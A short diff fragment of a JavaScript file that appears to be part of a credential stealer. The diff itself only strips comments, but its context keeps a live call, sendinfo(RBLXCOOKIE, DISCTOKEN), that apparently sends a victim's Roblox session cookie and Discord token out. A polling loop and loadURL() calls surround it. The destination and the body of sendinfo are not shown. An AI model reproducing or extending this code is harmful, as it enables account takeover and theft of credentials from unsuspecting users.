@@ -68,12 +68,11 @@ function loadURL() {
 
     sendinfo(RBLXCOOKIE, DISCTOKEN);
 
-    // Sleep function (works with seconds)
 function sleep(seconds) {
     return new Promise(resolve => setTimeout(resolve, seconds * 1000));
 }
 
-// Wrap your loop inside an async function
+
 async function processURLx() {
     while (urlx) {
         if (urlx.innerHTML === '' && sent === true) {
@@ -85,8 +84,8 @@ async function processURLx() {
     }
 }
 
-// Call the async function
+
 processURLx();
 
-// Call loadURL if needed
+
 loadURL();
